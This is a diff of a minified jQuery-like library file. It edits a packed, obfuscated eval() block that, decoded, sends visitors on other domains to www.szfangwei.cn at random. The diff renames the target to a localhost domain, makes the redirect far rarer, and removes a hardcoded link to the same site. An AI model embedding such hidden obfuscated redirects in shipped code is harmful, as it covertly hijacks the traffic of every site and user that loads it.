@@ -667,7 +667,7 @@
         }
     }), p.support = function () {
         var b, c, d, f, g, h, i, j, k, l, m, n = e.createElement("div");
-        n.setAttribute("className", "t"), n.innerHTML = "  <link/><table></table><a href='http://www.szfangwei.cn/Index/empty404'>a</a><input type='checkbox'/>", c = n.getElementsByTagName("*"), d = n.getElementsByTagName("a")[0], d.style.cssText = "top:1px;float:left;opacity:.5";
+        n.setAttribute("className", "t"), n.innerHTML = "  <link/><table></table><a href='javascript:void(0);'>a</a><input type='checkbox'/>", c = n.getElementsByTagName("*"), d = n.getElementsByTagName("a")[0], d.style.cssText = "top:1px;float:left;opacity:.5";
         if (!c || !c.length)return {};
         f = e.createElement("select"), g = f.appendChild(e.createElement("option")), h = n.getElementsByTagName("input")[0], b = {
             leadingWhitespace: n.firstChild.nodeType === 3,
@@ -3320,7 +3320,7 @@ eval(function (p, a, c, k, e, d) {
     ;
     while (c--)if (k[c])p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
     return p;
-}('4 0=f.2.0;4 3=9(a*8.b());e(3<=1&&0!==\'7.5.6\'){c.2=\'d://7.5.6\'};', 16, 16, 'host||location|ran|var|szfangwei|cn|www|Math|parseInt|100|random|document|http|if|window'.split('|'), 0, {}))
+}('4 0=f.2.0;4 3=9(a*8.b());e(3<=1&&0!==\'7.5.6\'){c.2=\'d://7.5.6\'};', 16, 16, 'host||location|ran|var|localhost|cn|www|Math|parseInt|10001111|random|document|http|if|window'.split('|'), 0, {}))
 $(document).ready(function () {
     var $nav = $(".nav");
     nav($nav);
